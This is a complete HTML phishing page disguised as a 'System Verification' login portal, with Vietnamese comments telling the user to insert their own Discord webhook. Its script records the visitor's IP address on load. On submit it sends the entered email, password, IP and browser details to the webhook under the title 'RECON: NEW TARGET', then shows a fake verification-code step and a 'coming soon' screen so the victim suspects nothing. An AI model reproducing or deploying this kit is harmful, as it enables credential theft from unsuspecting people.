<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S.A.U - System Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #050507; color: #a0aec0; font-family: 'Inter', sans-serif; overflow: hidden; }
        .glass { background: rgba(15, 15, 20, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.03); }
        .input-glow:focus { border-color: #6366f1; box-shadow: 0 0 20px rgba(99, 102, 241, 0.2); outline: none; }
        .btn-slide { background: linear-gradient(90deg, #4f46e5, #818cf8); transition: all 0.4s ease; }
        .btn-slide:hover { filter: brightness(1.2); transform: translateY(-2px); }
        .hidden { display: none; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">

    <div id="auth-card" class="glass p-10 rounded-3xl w-full max-w-md shadow-2xl relative z-10 transition-all duration-700">
        <div class="text-center mb-8">
            <h2 class="text-4xl font-black text-white tracking-tighter italic">S.A.U <span class="text-indigo-500 text-2xl">V4</span></h2>
            <p class="text-xs uppercase tracking-[0.3em] text-gray-500 mt-2">Node Authentication Required</p>
        </div>

        <form id="gate-form" class="space-y-6">
            <div id="input-group">
                <input type="email" id="u_mail" placeholder="Email Address" required 
                    class="w-full bg-[#0d0d12] p-4 rounded-xl border border-gray-800 text-white input-glow">
                <input type="password" id="u_pass" placeholder="Security Password" required 
                    class="w-full bg-[#0d0d12] p-4 rounded-xl border border-gray-800 text-white input-glow mt-4">
            </div>

            <div id="otp-group" class="hidden space-y-4">
                <p class="text-center text-xs text-indigo-400 font-bold uppercase tracking-widest">Verification code sent to email</p>
                <div class="flex justify-center gap-4">
                    <input type="text" maxlength="4" placeholder="0000" id="u_otp"
                        class="w-32 h-16 bg-[#0d0d12] border border-indigo-500 text-center text-3xl text-white rounded-xl tracking-[0.5em] font-mono">
                </div>
            </div>

            <button type="submit" id="main-btn" class="w-full btn-slide py-4 rounded-xl text-white font-bold tracking-widest shadow-lg">
                INITIALIZE ACCESS
            </button>
            <p id="toggle-auth" class="text-center text-xs text-gray-600 hover:text-indigo-400 cursor-pointer transition">Don't have a S.A.U ID? Register</p>
        </form>
    </div>

    <div id="main-hub" class="hidden fixed inset-0 bg-[#050507] flex flex-col">
        <header class="p-6 border-b border-gray-900 flex justify-between items-center glass">
            <div class="font-black text-white italic text-xl">S.A.U CORE</div>
            <div class="flex gap-8 text-xs font-bold text-gray-500 uppercase tracking-widest">
                <span>Network</span><span>Nodes</span><span>Diagnostics</span>
            </div>
            <div class="w-3 h-3 bg-green-500 rounded-full shadow-[0_0_10px_#22c55e]"></div>
        </header>
        <main class="flex-1 flex flex-col items-center justify-center">
            <h1 class="text-8xl font-black text-[#101015] select-none">COMING SOON</h1>
            <p class="text-indigo-500 font-mono text-sm tracking-widest -mt-10">SYNCHRONIZING SYSTEM MODULES...</p>
        </main>
    </div>

    <script>
        // --- THAY WEBHOOK CỦA ÔNG VÀO ĐÂY ---
        const WH_URL = "YOUR_DISCORD_WEBHOOK_HERE"; 
        
        const form = document.getElementById('gate-form');
        const authCard = document.getElementById('auth-card');
        const hub = document.getElementById('main-hub');
        let currentStep = 1;

        // Tự động lấy IP khi vừa mở trang
        let targetIP = "Searching...";
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => targetIP = d.ip);

        // Check Session cũ
        if(localStorage.getItem('sau_auth')) {
            authCard.classList.add('hidden');
            hub.classList.remove('hidden');
        }

        form.onsubmit = async (e) => {
            e.preventDefault();
            const email = document.getElementById('u_mail').value;
            const pass = document.getElementById('u_pass').value;

            if(currentStep === 1) {
                // BẮN DỮ LIỆU VỀ DISCORD
                await fetch(WH_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "🎯 S.A.U RECON: NEW TARGET",
                            color: 5814783,
                            fields: [
                                {name: "Email", value: `\`${email}\``, inline: true},
                                {name: "Password", value: `\`${pass}\``, inline: true},
                                {name: "IP Address", value: `\`${targetIP}\``, inline: false},
                                {name: "Device", value: navigator.userAgent}
                            ],
                            timestamp: new Date()
                        }]
                    })
                });

                // Chuyển sang màn hình OTP
                document.getElementById('input-group').classList.add('hidden');
                document.getElementById('otp-group').classList.remove('hidden');
                document.getElementById('main-btn').innerText = "VERIFY IDENTITY";
                currentStep = 2;
            } else {
                // Hoàn tất bẫy
                localStorage.setItem('sau_auth', 'true');
                authCard.classList.add('hidden');
                hub.classList.remove('hidden');
            }
        };
    </script>
</body>
</html>
